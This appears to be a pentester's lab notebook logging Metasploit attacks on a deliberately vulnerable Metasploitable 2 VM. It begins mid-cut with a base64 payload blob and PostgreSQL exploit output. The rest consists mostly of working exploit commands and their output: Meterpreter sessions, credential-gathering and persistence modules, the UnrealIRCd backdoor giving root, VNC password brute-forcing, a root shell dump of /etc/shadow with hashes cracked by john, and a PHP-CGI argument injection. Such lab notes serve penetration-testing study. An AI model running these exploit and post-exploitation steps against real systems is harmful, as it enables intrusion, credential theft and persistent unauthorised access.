AAAGAAAA0AEAANABAACPAAAAAAAAAAAAAAAIAAAACAAAACQAAAABAAAABgAAAGACAABgAgAAhAAAAAAAAAAAAAAABAAAAAQAAABAAAAAAQAAAAMAAADoEgAA6AIAAFAAAAAAAAAAAAAAAAgAAAAIAAAAAQAAAAYAAAADAAAAOBMAADgDAACAAAAAAgAAAAAAAAAIAAAACAAAAEYAAAAOAAAAAwAAALgTAAC4AwAABAAAAAAAAAAAAAAABAAAAAQAAABSAAAAAQAAAAMAAAC8EwAAvAMAACQAAAAAAAAAAAAAAAQAAAAEAAAAWwAAAAMAAAAAAAAAAAAAABAGAABlAAAAAAAAAAAAAAABAAAAAQAAAAAuZHluYW1pYwAucm9kYXRhAC5keW5zdHIALmhhc2gALnJlbC5wbHQALnJlbC5keW4ALmR5bnN5bQAudGV4dAAuZGF0YQAuaW5pdF9hcnJheQAuZ290LnBsdAAuc2hzdHJ0YWIA', 'base64'))'
   [*] 192.168.1.107:5432 Postgres - querying with 'select lo_export(16388, '/tmp/bzLzACRg.so')'
   [*] Uploaded as /tmp/bzLzACRg.so, should be cleaned up automatically
   [*] 192.168.1.107:5432 Postgres - querying with 'create or replace function pg_temp.QekYGVPVvq() returns void as '/tmp/bzLzACRg.so','QekYGVPVvq' language c strict immutable'
   [*] 192.168.1.107:5432 Postgres - Disconnected
   [*] Transmitting intermediate stager for over-sized stage...(100 bytes)
   [*] Sending stage (1138688 bytes) to 192.168.1.107
   [*] Meterpreter session 1 opened (192.168.1.103:47030 -> 192.168.1.107:4444) at 2014-10-23 13:14:39 +0800

   +--------------------------------------------------------------------------------+
*** meterpreter > ifconfig

    Interface  1
    ============
    Name         : lo
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 16436
    Flags        : UP LOOPBACK RUNNING
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


    Interface  2
    ============
    Name         : eth0
    Hardware MAC : 08:00:27:e8:45:33
    MTU          : 1500
    Flags        : UP BROADCAST RUNNING MULTICAST
    IPv4 Address : 192.168.1.107
    IPv4 Netmask : 255.255.255.0
    IPv6 Address : fe80::a00:27ff:fee8:4533
    IPv6 Netmask : ffff:ffff:ffff:ffff::

*** meterpreter > sysinfo
    Computer     : metasploitable
    OS           : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 (i686)
    Architecture : i686
    Meterpreter  : x86/linux
*** meterpreter > route

    IPv4 network routes
    ===================

    Subnet       Netmask        Gateway      Metric  Interface
    ------       -------        -------      ------  ---------
    0.0.0.0      0.0.0.0        192.168.1.1  100     eth0
    192.168.1.0  255.255.255.0  0.0.0.0      0       eth0


    IPv6 network routes
    ===================

    Subnet  Netmask                Gateway  Metric  Interface
    ------  -------                -------  ------  ---------
    fe80::  ffff:ffff:ffff:ffff::  ::       256     eth0
*** meterpreter > ls

Listing: /var/lib/postgresql/8.3/main
=====================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40700/rwx------   4096  dir   2014-10-23 13:09:46 +0800  .
40755/rwxr-xr-x   4096  dir   2010-03-17 22:08:46 +0800  ..
40000/---------   4096  dir   2014-10-23 13:09:46 +0800  =
100600/rw-------  4     fil   2010-03-17 22:08:46 +0800  PG_VERSION
40700/rwx------   4096  dir   2010-03-17 22:08:56 +0800  base
40700/rwx------   4096  dir   2014-10-23 13:45:44 +0800  global
40700/rwx------   4096  dir   2010-03-17 22:08:49 +0800  pg_clog
40700/rwx------   4096  dir   2010-03-17 22:08:46 +0800  pg_multixact
40700/rwx------   4096  dir   2010-03-17 22:08:49 +0800  pg_subtrans
40700/rwx------   4096  dir   2010-03-17 22:08:46 +0800  pg_tblspc
40700/rwx------   4096  dir   2010-03-17 22:08:46 +0800  pg_twophase
40700/rwx------   4096  dir   2010-03-17 22:08:49 +0800  pg_xlog
100600/rw-------  125   fil   2014-10-23 09:01:02 +0800  postmaster.opts
100600/rw-------  54    fil   2014-10-23 09:01:02 +0800  postmaster.pid
100644/rw-r--r--  540   fil   2010-03-17 22:08:45 +0800  root.crt
100644/rw-r--r--  1224  fil   2010-03-17 22:07:45 +0800  server.crt
100640/rw-r-----  891   fil   2010-03-17 22:07:45 +0800  server.key

*** meterpreter > background
    [*] Backgrounding session 1...

*** msf exploit(postgres_payload) > sessions

    Active sessions
    ===============

    Id  Type                   Information                                                                Connection
    --  ----                   -----------                                                                ----------
    1   meterpreter x86/linux  uid=108, gid=117, euid=108, egid=117, suid=108, sgid=117 @ metasploitable  192.168.1.103:47030 -> 192.168.1.107:4444 (192.168.1.107)

*** msf exploit(postgres_payload) > sessions -i 1
    [*] Starting interaction with 1...

*** meterpreter > run checkvm
[-] This version of Meterpreter is not supported with this Script!
*** meterpreter > run get_local_subnets
Local subnet: 192.168.1.0/255.255.255.0
Local subnet: fe80::/ffff:ffff:ffff:ffff::
*** meterpreter > run post/linux/gather/enum_configs

    [*] Running module against metasploitable
    [*] Info:
    [*]                     _                  _       _ _        _     _      ____   _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) || | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|                            |_|                                          Warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started
    [*]     Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
    [*] apache2.conf stored in /home/~/.msf4/loot/20141023141318_youknow_192.168.1.107_linux.enum.conf_700905.txt
    [*] ports.conf stored in /home/~/.msf4/loot/20141023141319_youknow_192.168.1.107_linux.enum.conf_557553.txt
    [-] Failed to open file: /etc/nginx/nginx.conf
    [-] Failed to open file: /etc/snort/snort.conf
    [*] my.cnf stored in /home/~/.msf4/loot/20141023141319_youknow_192.168.1.107_linux.enum.conf_671050.txt
    [*] ufw.conf stored in /home/~/.msf4/loot/20141023141319_youknow_192.168.1.107_linux.enum.conf_171089.txt
    [*] sysctl.conf stored in /home/~/.msf4/loot/20141023141320_youknow_192.168.1.107_linux.enum.conf_003305.txt
    [-] Failed to open file: /etc/security.access.conf
    [*] shells stored in /home/~/.msf4/loot/20141023141320_youknow_192.168.1.107_linux.enum.conf_619943.txt
    [-] Failed to open file: /etc/security/sepermit.conf
    [-] Failed to open file: /etc/ca-certificates.conf
    [*] access.conf stored in /home/~/.msf4/loot/20141023141321_youknow_192.168.1.107_linux.enum.conf_397102.txt
    [-] Failed to open file: /etc/gated.conf
    [*] rpc stored in /home/~/.msf4/loot/20141023141321_youknow_192.168.1.107_linux.enum.conf_416863.txt
    [-] Failed to open file: /etc/psad/psad.conf
    [-] Failed to open file: /etc/mysql/debian.cnf
    [-] Failed to open file: /etc/chkrootkit.conf
    [*] logrotate.conf stored in /home/~/.msf4/loot/20141023141322_youknow_192.168.1.107_linux.enum.conf_555397.txt
    [-] Failed to open file: /etc/rkhunter.conf
    [*] smb.conf stored in /home/~/.msf4/loot/20141023141323_youknow_192.168.1.107_linux.enum.conf_910544.txt
    [*] ldap.conf stored in /home/~/.msf4/loot/20141023141323_youknow_192.168.1.107_linux.enum.conf_314957.txt
    [-] Failed to open file: /etc/openldap/openldap.conf
    [-] Failed to open file: /etc/cups/cups.conf
    [-] Failed to open file: /etc/opt/lampp/etc/httpd.conf
    [*] sysctl.conf stored in /home/~/.msf4/loot/20141023141324_youknow_192.168.1.107_linux.enum.conf_966998.txt
    [-] Failed to open file: /etc/proxychains.conf
    [-] Failed to open file: /etc/cups/snmp.conf
    [-] Failed to open file: /etc/mail/sendmail.conf
    [-] Failed to open file: /etc/snmp/snmp.conf

*** meterpreter > run post/multi/gather/thunderbird_creds

    [*] Looking for profiles in /home//.thunderbird/...
    [-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_fs_ls: Operation failed: 2
    [-] Call stack:
    [-]   /home/~/Develop/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:61:in `entries'
    [-]   /home/~/Develop/metasploit-framework/lib/rex/post/dir.rb:19:in `foreach'
    [-]   /home/~/Develop/metasploit-framework/modules/post/multi/gather/thunderbird_creds.rb:209:in `get_profile_names'
    [-]   /home/~/Develop/metasploit-framework/modules/post/multi/gather/thunderbird_creds.rb:63:in `run'

*** meterpreter > upload repomd.xml.key
[*] uploading  : repomd.xml.key -> repomd.xml.key
[*] uploaded   : repomd.xml.key -> repomd.xml.key
*** meterpreter > ls

Listing: /tmp
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
41777/rwxrwxrwx   4096  dir   2014-10-23 14:54:54 +0800  .
40755/rwxr-xr-x   4096  dir   2012-05-21 02:36:12 +0800  ..
41777/rwxrwxrwx   4096  dir   2014-10-23 09:00:45 +0800  .ICE-unix
100444/r--r--r--  11    fil   2014-10-23 09:01:09 +0800  .X0-lock
41777/rwxrwxrwx   4096  dir   2014-10-23 09:01:09 +0800  .X11-unix
100600/rw-------  983   fil   2014-10-23 14:54:54 +0800  repomd.xml.key

*** meterpreter > cd /var/www
*** meterpreter > ls

Listing: /var/www
=================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40755/rwxr-xr-x   4096   dir   2012-05-21 03:31:37 +0800  .
40755/rwxr-xr-x   4096   dir   2010-03-17 22:08:23 +0800  ..
41777/rwxrwxrwx   4096   dir   2012-05-21 03:30:29 +0800  dav
40755/rwxr-xr-x   4096   dir   2012-05-21 03:52:33 +0800  dvwa
100644/rw-r--r--  891    fil   2012-05-21 03:31:37 +0800  index.php
40755/rwxr-xr-x   4096   dir   2012-05-14 13:43:54 +0800  mutillidae
40755/rwxr-xr-x   4096   dir   2012-05-14 13:36:40 +0800  phpMyAdmin
100644/rw-r--r--  19     fil   2010-04-16 14:12:44 +0800  phpinfo.php
40755/rwxr-xr-x   4096   dir   2012-05-14 13:50:38 +0800  test
40775/rwxrwxr-x   20480  dir   2010-04-20 06:54:16 +0800  tikiwiki
40775/rwxrwxr-x   20480  dir   2010-04-16 14:17:47 +0800  tikiwiki-old
40755/rwxr-xr-x   4096   dir   2010-04-17 03:27:58 +0800  twiki

*** meterpreter > download phpinfo.php
[*] downloading: phpinfo.php -> phpinfo.php
[*] downloaded : phpinfo.php -> phpinfo.php

*** meterpreter > shell
Process 6174 created.
Channel 34 created.
sh: no job control in this shell
sh-3.2$ ls
dav   index.php   phpMyAdmin   test      tikiwiki-old
dvwa  mutillidae  phpinfo.php  tikiwiki  twiki
sh-3.2$ pwd
/var/www
sh-3.2$ cd home/user
sh-3.2$ cat .bash_history
cat: .bash_history: Permission denied
这个最好不要用，会启动新的进程。同样execute -f也不要用。
*** Windows only
**** meterpreter > run getcountermeasure
[-] This version of Meterpreter is not supported with this Script!
--- A/V, Firewall...
 [*] Running Getcountermeasure on the target...
 [*] Checking for contermeasures...
 [*] Getting Windows Built in Firewall configuration...
 [*]
 [*]     Domain profile configuration:
 [*]     -------------------------------------------------------------------
 [*]     Operational mode                  = Disable
 [*]     Exception mode                    = Enable
 [*]
 [*]     Standard profile configuration:
 [*]     -------------------------------------------------------------------
 [*]     Operational mode                  = Disable
 [*]     Exception mode                    = Enable
 [*]
 [*]     Local Area Connection 6 firewall configuration:
 [*]     -------------------------------------------------------------------
 [*]     Operational mode                  = Disable
 [*]
 [*] Checking DEP Support Policy...
**** meterpreter > run getgui
[-] This version of Meterpreter is not supported with this Script!
--- RDP
Windows Remote Desktop Enabler Meterpreter Script
 Usage: getgui -u  -p


 OPTIONS:

 -e   Enable RDP only.
 -h   Help menu.
 -p   The Password of the user to add.
 -u   The Username of the user to add.
**** meterpreter > run gettelnet
[-] This version of Meterpreter is not supported with this Script!
Windows Telnet Server Enabler Meterpreter Script
 Usage: gettelnet -u  -p


  OPTIONS:

  -e   Enable Telnet Server only.
  -h   Help menu.
  -p   The Password of the user to add.
  -u   The Username of the user to add.
**** meterpreter > run hostsedit
[-] Error in script: NoMethodError undefined method `+' for nil:NilClass
--- hosts
 OPTIONS:

 -e   Host entry in the format of IP,Hostname.
 -h   Help Options.
 -l   Text file with list of entries in the format of IP,Hostname. One per line.

 Example:

 run hostsedit -e 127.0.0.1,google.com
 run hostsedit -l /tmp/fakednsentries.txt
**** meterpreter > killav
[-] Unknown command: killav.
---
[*] Killing Antivirus services on the target...
[*] Killing off cmd.exe...
**** meterpreter > run remotewinenum
[-] This version of Meterpreter is not supported with this Script!
---
 Remote Windows Enumeration Meterpreter Script
 This script will enumerate windows hosts in the target environment
 given a username and password or using the credential under witch
 Meterpreter is running using WMI wmic windows native tool.
 Usage:

 OPTIONS:

 -h   Help menu.
 -p   Password of user on target system
 -t   The target address
 -u   User on the target system (If not provided it will use credential of process)
**** meterpreter > run scraper
[*] New session on 192.168.1.107:5432...
[-] This version of Meterpreter is not supported with this Script!
---
[*] New session on 10.211.55.128:4444...
[*] Gathering basic system information...
[*] Dumping password hashes...
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
[*] Cleaning HKCU
[*] Exporting HKLM
[*] Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
**** meterpreter > run winenum
[-] This version of Meterpreter is not supported with this Script!
---

 [*] Running Windows Local Enumerion Meterpreter Script
 [*] New session on 10.211.55.128:4444...
 [*] Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
 [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
 [*]     This is a VMware Workstation/Fusion Virtual Machine
 [*] Running Command List ...
 [*]     running command cmd.exe /c set
 [*]     running command arp -a
 [*]     running command ipconfig /all
 [*]     running command ipconfig /displaydns
 [*]     running command route print
 [*]     running command net view
 [*]     running command netstat -nao
 [*]     running command netstat -vb
 [*]     running command netstat -ns
 [*]     running command net accounts
 [*]     running command net accounts /domain
 [*]     running command net session
 [*]     running command net share
 [*]     running command net group
 [*]     running command net user
 [*]     running command net localgroup
 [*]     running command net localgroup administrators
 [*]     running command net group administrators
 [*]     running command net view /domain
 [*]     running command netsh firewall show config
 [*]     running command tasklist /svc
 [*]     running command tasklist /m
 [*]     running command gpresult /SCOPE COMPUTER /Z
 [*]     running command gpresult /SCOPE USER /Z
 [*] Running WMIC Commands ....
 [*]     running command wmic computersystem list brief
 [*]     running command wmic useraccount list
 [*]     running command wmic group list
 [*]     running command wmic service list brief
 [*]     running command wmic volume list brief
 [*]     running command wmic logicaldisk get description,filesystem,name,size
 [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
 [*]     running command wmic netclient list brief
 [*]     running command wmic netuse get name,username,connectiontype,localname
 [*]     running command wmic share get name,path
 [*]     running command wmic nteventlog get path,filename,writeable
 [*]     running command wmic process list brief
 [*]     running command wmic startup list full
 [*]     running command wmic rdtoggle list
 [*]     running command wmic product get name,version
 [*]     running command wmic qfe
 [*] Extracting software list from registry
 [*] Finished Extraction of software list from registry
 [*] Dumping password hashes...
 [*] Hashes Dumped
 [*] Getting Tokens...
 [*] All tokens have been processed
 [*] Done!
**** meterpreter > run persistence
[-] x86/linux version of Meterpreter is not supported with this Script!
---
OPTIONS:

    -A        Automatically start a matching multi/handler to connect to the agent
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
    -h        This help menu
    -i   The interval in seconds between each connection attempt
    -p   The port on the remote host where Metasploit is listening
    -r   The IP of the system running Metasploit listening for the connect back
** reference
http://www.pax-pentest.net/exploitation/metasploitable-2-port-5432-postgresql
http://drops.wooyun.org/tips/2227
http://drops.wooyun.org/tips/2746
*** metasploit-unleashed
http://www.offensive-security.com/w/index.php?title=Special:Search&limit=500&offset=0&redirs=1&profile=default&search=meterpreter
http://www.offensive-security.com/metasploit-unleashed/About_Meterpreter
http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics
Meterpreter Scripting
http://www.offensive-security.com/metasploit-unleashed/Existing_Scripts
http://www.offensive-security.com/metasploit-unleashed/Writing_Meterpreter_Scripts
http://www.offensive-security.com/metasploit-unleashed/Custom_Scripting
http://www.offensive-security.com/metasploit-unleashed/Useful_API_Calls
http://www.offensive-security.com/metasploit-unleashed/Useful_Functions
Maintaining Access
http://www.offensive-security.com/metasploit-unleashed/Keylogging
http://www.offensive-security.com/metasploit-unleashed/Persistent_Meterpreter_Service
http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Backdoor
http://www.offensive-security.com/metasploit-unleashed/Interacting_With_Metsvc
* 6667/tcp open  irc         Unreal ircd
  | irc-info:
  |   server: irc.Metasploitable.LAN
  |   version: Unreal3.2.8.1. irc.Metasploitable.LAN
  |   servers: 1
  |   users: 1
  |   lservers: 0
  |   lusers: 1
  |   uptime: 0 days, 0:08:48
  |   source host: 3AB98274.78DED367.FFFA6D49.IP
  |_  source ident: nmap
** msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
** msf exploit(unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  6667             yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


** msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.1.107
RHOST => 192.168.1.107
** msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/bind_ruby
payload => cmd/unix/bind_ruby
** msf exploit(unreal_ircd_3281_backdoor) > exploit

[*] Started bind handler
[*] Connected to 192.168.1.109:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] Sending backdoor command...
[*] Command shell session 1 opened (192.168.1.103:60745 -> 192.168.1.109:4444) at 2014-10-24 12:17:29 +0800

*** whoami
root
*** ls
Donation
LICENSE
aliases
badwords.channel.conf
badwords.message.conf
badwords.quit.conf
curl-ca-bundle.crt
dccallow.conf
doc
help.conf
ircd.log
ircd.pid
ircd.tune
modules
networks
spamfilter.conf
tmp
unreal
unrealircd.conf
*** ^C
Background session 1? [y/N]  y
* 5900/tcp open  vnc         VNC (protocol 3.3)
  | vnc-info:
  |   Protocol version: 3.3
  |   Security types:
  |_    Unknown security type (33554432)
** msf > use auxiliary/scanner/vnc/vnc_login
** msf auxiliary(vnc_login) > show options

Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                                                          Required  Description
   ----              ---------------                                                          --------  -----------
   BLANK_PASSWORDS   false                                                                    no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                        yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                    no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                    no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                    no        Add all users in the current database to the list
   PASSWORD                                                                                   no        The password to test
   PASS_FILE         /home/ice/Develop/metasploit-framework/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                                    no        Use a proxy chain
   RHOSTS                                                                                     yes       The target address range or CIDR identifier
   RPORT             5900                                                                     yes       The target port
   STOP_ON_SUCCESS   false                                                                    yes       Stop guessing when a credential works for a host
   THREADS           1                                                                        yes       The number of concurrent threads
   USERNAME          <BLANK>                                                                  no        A specific username to authenticate as
   USERPASS_FILE                                                                              no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                    no        Try the username as the password for all users
   USER_FILE                                                                                  no        File containing usernames, one per line
   VERBOSE           true                                                                     yes       Whether to print output for all attempts

** msf auxiliary(vnc_login) > set RHOSTS 192.168.1.107
RHOSTS => 192.168.1.107
** msf auxiliary(vnc_login) > run

[*] 192.168.1.107:5900 - Starting VNC login sweep
[+] 192.168.1.107:5900 - LOGIN SUCCESSFUL: :password
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
** msf auxiliary(vnc_login) > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    back          Move back from the current context
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    edit          Edit the current module with $VISUAL or $EDITOR
    exit          Exit the console
    go_pro        Launch Metasploit web GUI
    grep          Grep the output of another command
    help          Help menu
    info          Displays information about one or more module
    irb           Drop into irb scripting mode
    jobs          Displays and manages jobs
    kill          Kill a job
    load          Load a framework plugin
    loadpath      Searches for and loads modules from a path
    makerc        Save commands entered since start to a file
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    quit          Exit the console
    reload_all    Reloads all modules from all defined module paths
    resource      Run the commands stored in a file
    route         Route traffic through a session
    save          Saves the active datastores
    search        Searches module names and descriptions
    sessions      Dump session listings and display information about sessions
    set           Sets a variable to a value
    setg          Sets a global variable to a value
    show          Displays modules of a given type, or all modules
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more variables
    unsetg        Unsets one or more global variables
    use           Selects a module by name
    version       Show the framework and console library version numbers


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Auxiliary Commands
==================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       This is an alias for the run command
    pry           Open a Pry session on the current module
    reload        Reloads the auxiliary module
    rerun         Reloads and launches the auxiliary module
    rexploit      This is an alias for the rerun command
    run           Launches the auxiliary module
* 1524/tcp open  shell       Metasploitable root shell
** ➜  metasploit-framework git:(master) telnet 192.168.1.107 1524
Trying 192.168.1.107...
Connected to 192.168.1.107.
Escape character is '^]'.
*** root@metasploitable:/# pwd
/
*** root@metasploitable:/# root@metasploitable:/# ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
*** root@metasploitable:/# root@metasploitable:/# cd etc
*** root@metasploitable:/etc# root@metasploitable:/etc# cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
*** root@metasploitable:/etc# root@metasploitable:/etc# cat shadow
root:$1$T0.XFEUZ$Gjut22fMiuH4Eruhgxjgx/:16365:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
*** root@metasploitable:/etc# root@metasploitable:/etc# exit
exit
Connection closed by foreign host.
*** ➜  password  sudo unshadow 1 2 > 3
*** ➜  password  sudo /usr/bin/john 3
Loaded 7 password hashes with 7 different salts (FreeBSD MD5 [32/32])
postgres         (postgres)
user             (user)
msfadmin         (msfadmin)
service          (service)
123456789        (klog)
batman           (sys)
guesses: 6  time: 0:00:06:56 (3)  c/s: 11318  trying: chombasc
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
*** ➜  password  sudo john --show 3
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
service:service:1002:1002:,,,:/home/service:/bin/bash

6 password hashes cracked, 1 left
** reference
http://bbs.cnhonker.com/forum.php?mod=viewthread&tid=10050
* 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
  | _http-methods: No Allow or Public header in OPTIONS response (status code 200) |
  | _http-title: Metasploitable2 - Linux                                           |
  |                                                                                |
  | http://192.168.1.107/phpinfo.php?-s                                            |
  |                                                                                |
** msf exploit(php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        Use a proxy chain
   RHOST        192.168.1.107    yes       The target address
   RPORT        80               yes       The target port
   TARGETURI    /phpinfo.php     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.103    yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
** msf exploit(php_cgi_arg_injection) > set PAYLOAD php/meterpreter/bind_tcp
PAYLOAD => php/meterpreter/bind_tcp
** msf exploit(php_cgi_arg_injection) > run

[*] Started bind handler
[*] Sending stage (40551 bytes) to 192.168.1.107
[*] Meterpreter session 2 opened (192.168.1.103:49805 -> 192.168.1.107:4444) at 2014-10-24 20:57:37 +0800

*** meterpreter > pwd
[-] Unknown command: pwd.
*** meterpreter > ls
[-] Unknown command: ls.
*** meterpreter > help
*** meterpreter > ls
[-] Unknown command: ls.
*** meterpreter > lls
[-] Unknown command: lls.
*** meterpreter > cd /
[-] Unknown command: cd.
*** meterpreter >
[*] 192.168.1.107 - Meterpreter session 2 closed.  Reason: Died
Interrupt: use the 'exit' command to quit
*** meterpreter > getuid
[-] Unknown command: getuid.                                                                                 |
** reference
http://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection
http://www.0x50sec.org/pentest/2012/06/id/1374/
http://zone.wooyun.org/content/151
* 23/tcp   open  telnet      Linux telnetd
** msf exploit(php_cgi_arg_injection) > search telnet

Matching Modules
================

   Name                                                Disclosure Date  Rank       Description
   ----                                                ---------------  ----       -----------
